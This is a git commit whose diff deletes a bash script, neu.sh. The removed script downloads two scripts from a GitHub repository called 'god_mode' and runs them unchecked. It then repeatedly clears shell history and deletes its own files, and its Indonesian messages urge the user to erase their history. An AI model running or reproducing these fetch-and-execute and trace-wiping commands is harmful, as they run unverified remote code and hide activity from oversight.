e21eabd6aaa4cc2362f8f50a1c84cd2904c033fe
bangsawantimur <129656591+bangsawantimur@users.noreply.github.com>
2023-05-14 04:43:37 +0700

    Update neu.sh

--- neu.sh
+++ neu.sh
@@ -1,17 +1,1 @@
-#!/usr/bin/bash
-mkdir levi
-cd levi
-curl https://raw.githubusercontent.com/bangsawantimur/god_mode/main/titid -O tun.sh
-bash tun.sh
-history -c
-curl -O https://raw.githubusercontent.com/bangsawantimur/god_mode/main/yuukikazama.sh
-bash yuukikazama.sh
-echo "Semangat menjalini hidup mu"
-echo "Bangun lah jalan mu sendiri jadi lah raja di satu kaum mu"
-echo "jangan lupa command history -c"
-echo "untuk menghapus history anda"
-rm -rf *.sh
-cd ..
-rm -rf *.sh
-history -c
-rm -rf levi
+.
